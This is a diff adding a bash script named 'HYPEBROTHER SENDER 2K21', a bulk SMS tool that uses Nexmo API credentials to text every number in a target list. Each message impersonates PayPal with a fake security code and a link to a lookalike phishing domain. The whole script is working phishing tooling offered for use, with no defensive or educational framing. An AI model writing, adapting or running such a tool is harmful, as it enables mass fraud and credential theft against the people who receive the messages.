@@ -1,0 +1,64 @@
+#!/bin/bash
+##############################################################
+##                    COLORING YOUR SHELL                   ##
+##############################################################
+white="\033[1;37m"                                          ##
+grey="\033[0;37m"                                           ##
+purple="\033[0;35m"                                         ##
+red="\e[91m"                                                ##
+green="\e[92m"                                              ##
+yellow="\e[93m"                                             ##
+purple="\033[0;35m"                                         ##
+cafe="\033[0;33m"                                           ##
+fiuscha="\033[0;35m"                                        ##
+blue="\033[0;36m"                                           ##
+darkgrey="\e[100m"                                          ##
+nc="\e[0m"                                                  ##
+##############################################################
+clear
+nBanner() {
+printf "${blue}
+      __  ______ _____                __         
+     / / / / __ ) ___/___  ____  ____/ /__  _____
+    / /_/ / __  \__ \/ _ \/ __ \/ __  / _ \/ ___/
+   / __  / /_/ /__/ /  __/ / / / /_/ /  __/ /    
+  /_/ /_/_____/____/\___/_/ /_/\__,_/\___/_/${white}     
+                                               
+  [${purple}HYPEBROTHER SENDER ${green}2K21${white} - MODE : ${green}NEXMO${white}]
+"
+}
+nBanner
+printf "\n${purple}  ▸ ${white}LIST         : "
+read nList
+
+## NEXMO ACCOUNT ##
+nKey=$(cat Account/nexmo.json | jq .apikey | tr -d '"')
+nSecret=$(cat Account/nexmo.json | jq .apisecret | tr -d '"')
+
+## LETTER ##
+## $(((RND=RANDOM<<15|RANDOM)) ; echo ${RND: -6}) ITS A 6 DIGIT RANDOM NUMBER
+nLetter="<#> PayPal: Your security code is ($(((RND=RANDOM<<15|RANDOM)) ; echo ${RND: -6})). This code will expire in 10 minutes. If this isn't you, update your information at https://manage-pay.pa.l.webcgi-bin.com/r/6LWfoMw"
+
+## BANNER ##
+clear
+nBanner
+printf "\n${purple}  ▸ ${white}BALANCE : ${yellow}$(curl -s "https://rest.nexmo.com/account/get-balance?api_key=$nKey&api_secret=$nSecret" | jq .value)
+${purple}  ▸ ${white}SEND TO ${purple}$(cat List/Send/$nList | wc -l)${white} NUMBERS\n
+  ==================================== ${white}$(date +"%H:%M:%S") ===================================="
+
+function nLoopSend() {
+	sendnexmo="${1}"
+    if [[ $(curl -s -X "POST" "https://rest.nexmo.com/sms/json" -d "from=$(cat Account/nexmo.json| jq .fromnumber)" -d "text=$nLetter" -d "to=$nSendMain" -d "api_key=$nKey" -d "api_secret=$nSecret" | jq '.messages | .[].status' | tr -d '"') =~ "0" ]]; then
+		printf "  ${white}[$(cat List/Send/$nList | grep -n "$nSendMain" | awk -F ":" '{print $1}')/${purple}$(cat List/Send/$nList | wc -l)${white}] [${yellow}$(date +"%H:%M:%S")${white}]-[${green}DONE${white}]---->>[${purple}Balance ${white}: $(curl -s "https://rest.nexmo.com/account/get-balance?api_key=$nKey&api_secret=$nSecret" | jq .value)${white}]---->>[SEND TO : ${green}$nSendMain${white}] \n"
+	else
+		printf "  ${white}[$(cat List/Send/$nList | grep -n "$nSendMain" | awk -F ":" '{print $1}')/${purple}$(cat List/Send/$nList | wc -l)${white}] [${yellow}$(date +"%H:%M:%S")${white}]-[${red}FAILED${white}]---->>[${purple}Error ${white}: ${red}$(curl -s -X "POST" "https://rest.nexmo.com/sms/json" -d "from=$nFromNumb" -d "text=$nLetter" -d "to=$nSendMain" -d "api_key=$nKey" -d "api_secret=$nSecret" | jq '.messages | .[]."error-text"' | tr -d '"')${white}]---->>[SEND TO : ${red}$nSendMain${white}] \n"
+	fi
+	wait
+}
+
+for nSendMain in $(cat List/Send/$nList); do
+    ((cthread=cthread%1)); ((cthread++==0)) && wait
+    nLoopSend "$nSendMain" &
+done
+wait
+printf "  ==================================== ${white} FINISH  ====================================\n\n"
